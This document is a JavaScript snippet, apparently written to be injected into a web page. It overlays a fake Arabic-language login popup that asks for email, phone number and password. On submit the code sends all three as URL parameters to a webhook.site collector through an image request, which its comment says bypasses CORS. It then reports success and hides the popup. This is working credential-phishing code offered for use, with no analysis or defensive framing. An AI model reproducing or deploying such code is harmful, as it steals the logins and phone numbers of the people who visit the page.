// Toggle this variable to enable/disable the popup.
var enablePopup = true;

if (enablePopup) {
    // Create the popup container
    var popup = document.createElement("div");
    popup.style.position = "fixed";
    popup.style.top = "50%";
    popup.style.left = "50%";
    popup.style.transform = "translate(-50%, -50%)";
    popup.style.backgroundColor = '#1E0232';
    popup.style.padding = "20px";
    popup.style.borderRadius = "10px";
    popup.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.5)";
    popup.style.color = "white";
    popup.style.textAlign = "center";
    popup.style.fontFamily = "Arial, sans-serif";
    popup.style.width = "90%";
    popup.style.maxWidth = "400px";
    popup.style.zIndex = "1000";

    // Add the title
    var title = document.createElement("h2");
    title.textContent = "للمتابعة يجب عليك تسجيل الدخول";
    title.style.marginBottom = "20px";
    popup.appendChild(title);

    // Function to create an input field
    function createInput(type, placeholder) {
        var input = document.createElement("input");
        input.type = type;
        input.placeholder = placeholder;
        input.style.width = "90%";
        input.style.padding = "15px";
        input.style.margin = "10px 0";
        input.style.border = "1px solid #555";
        input.style.borderRadius = "5px";
        input.style.backgroundColor = "white";
        input.style.color = "black"; // Ensure text is visible
        input.style.caretColor = "black"; // Ensure cursor is visible
        input.style.fontSize = "16px";
        return input;
    }

    // Add input fields
    var emailInput = createInput("text", "...البريد الالكتروني");
    var phoneInput = createInput("text", "...رقم الهاتف");
    var passwordInput = createInput("password", "...كلمة المرور");

    popup.appendChild(emailInput);
    popup.appendChild(phoneInput);
    popup.appendChild(passwordInput);

    // Add the login button
    var loginButton = document.createElement("button");
    loginButton.textContent = "تسجيل الدخول";
    loginButton.style.width = "50%";
    loginButton.style.padding = "10px";
    loginButton.style.backgroundColor = "#007BFF";
    loginButton.style.border = "none";
    loginButton.style.borderRadius = "5px";
    loginButton.style.color = "white";
    loginButton.style.fontSize = "16px";
    loginButton.style.cursor = "pointer";
    loginButton.style.marginTop = "10px";

    loginButton.addEventListener("click", function () {
        // Validate phone number (only numbers, 11 digits)
        var phoneRegex = /^\d{11}$/;
        if (!phoneRegex.test(phoneInput.value)) {
            alert("يرجى إدخال رقم هاتف مكون من 11 رقماً!");
            return;
        }

        // Check password
        if (!passwordInput.value) {
            alert("يرجى إدخال كلمة المرور!");
            return;
        }

        // Encode the credentials as URL parameters
        var url = "https://webhook.site/78735d80-a09c-471a-b188-5aee323d456c"
            + "?email=" + encodeURIComponent(emailInput.value)
            + "&phone=" + encodeURIComponent(phoneInput.value)
            + "&password=" + encodeURIComponent(passwordInput.value);

        // Send the data using an image request (bypasses CORS)
        var img = new Image();
        img.src = url;

        alert("تم إرسال البيانات بنجاح!");
        document.body.removeChild(popup);
    });

    popup.appendChild(loginButton);

    // Add the popup to the body
    document.body.appendChild(popup);
}
